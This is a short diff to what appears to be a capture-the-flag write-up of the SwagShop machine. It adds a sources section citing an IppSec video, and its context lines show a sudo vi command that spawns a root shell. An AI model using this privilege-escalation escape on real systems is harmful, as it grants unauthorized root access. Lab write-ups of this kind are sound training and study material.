@@ -111,3 +111,7 @@ so in this place,
 sudo vi /var/www/html/test -c ':!/bin/sh' /dev/null
 Then we can get the root shell.
 ```
+
+## Fuentes / Sources
+
+- [IppSec: SwagShop (video)](https://youtube.com/watch?v=qECG2_8xw_s) - IppSec - fecha de acceso: 2026-09-24.
